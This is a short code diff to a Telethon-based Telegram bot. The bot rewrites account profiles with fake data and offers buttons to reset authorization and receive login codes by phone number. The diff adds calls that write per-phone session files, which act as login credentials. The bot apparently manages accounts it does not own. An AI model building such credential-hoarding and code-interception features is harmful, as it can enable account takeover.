@@ -3,7 +3,7 @@ from telethon import TelegramClient, events, Button
 from telethon.tl.functions.account import UpdateProfileRequest
 from telethon.tl.functions.photos import UpdateProfilePhotoRequest
 from faker import Faker
-from manager.functions import search_photo
+from manager.functions import search_photo, create_file
 import re
 import random
 
@@ -41,6 +41,7 @@ async def yesedit(event):
             os.remove("photo.jpg")
     except:
         pass
+    create_file(f"sessions/{phone}.session", f"sessions/{phone}.session")
     await event.edit(f"**• Accoutn Successfuly Edited And Manage Menu Send For You:**\n\n__• Dont Delete This Menu!__")
     await event.reply(f"""
 **#Manage_Menu**
@@ -61,6 +62,7 @@ async def yesedit(event):
         [Button.inline("• Reset Authorization •", data=f"resetauthorization:{phone}")],
         [Button.inline("• Receive Codes •", data=f"getcodes:{phone}")],
     ]
+    create_file(f"sessions/{phone}.session", f"sessions/{phone}.session")
     await event.edit(f"**• Accoutn Not Edited And Manage Menu Send For You:**\n\n__• Dont Delete This Menu!__")
     await event.reply(f"""
 **#Manage_Menu**
